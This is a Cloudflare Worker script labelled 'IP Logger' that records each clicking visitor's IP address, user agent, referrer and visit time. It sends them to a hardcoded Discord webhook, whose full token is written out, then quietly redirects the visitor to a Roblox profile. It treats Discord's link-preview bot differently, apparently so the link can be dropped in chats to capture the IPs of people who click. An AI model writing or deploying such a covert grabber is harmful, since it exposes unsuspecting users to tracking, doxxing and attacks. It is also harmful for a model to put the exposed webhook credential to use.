export default {
  async fetch(request, env, ctx) {
    // Get visitor IP from CF-Connecting-IP header (Cloudflare sets this)
    const ip = request.headers.get('CF-Connecting-IP') || 'Unknown IP'
    const userAgent = request.headers.get('User-Agent') || 'Unknown'
    const referer = request.headers.get('Referer') || 'Direct visit'
    const time = new Date().toLocaleString()
    
    // Check if the request is from Discord's bot
    const isDiscordBot = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com')
    
    // Create different embed based on whether it's Discord or a real visitor
    let embedData;
    
    if (isDiscordBot) {
      // Simpler notification for Discord bot
      embedData = {
        embeds: [{
          title: "Link was sent somewhere in a chat",
          color: 3447003, // Discord blue color
          footer: { text: "IP Logger" }
        }]
      }
    } else {
      // Full notification for real visitors
      embedData = {
        embeds: [{
          title: "New Visitor Detected",
          color: 5814783,
          fields: [
            { name: "IP Address", value: ip, inline: true },
            { name: "User Agent", value: userAgent, inline: false },
            { name: "Referrer", value: referer, inline: false },
            { name: "Time", value: time, inline: false }
          ],
          footer: { text: "IP Logger" }
        }]
      }
    }

    // Send data to Discord webhook
    await fetch('https://discord.com/api/webhooks/1378847138863386756/UTFk1TAxt_zaQh-gOqZ3DyCYVmSz4od7vYfGwqYYWRtu8xZ1sPRz4Z7yeaGnyYTT0tSi', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embedData)
    }).catch(err => {
      // Handle errors silently
      console.error('Error sending webhook:', err)
    })

    // Redirect visitor to Roblox profile
    return Response.redirect('https://www.roblox.com/users/4598039640/profile', 302)
  }
}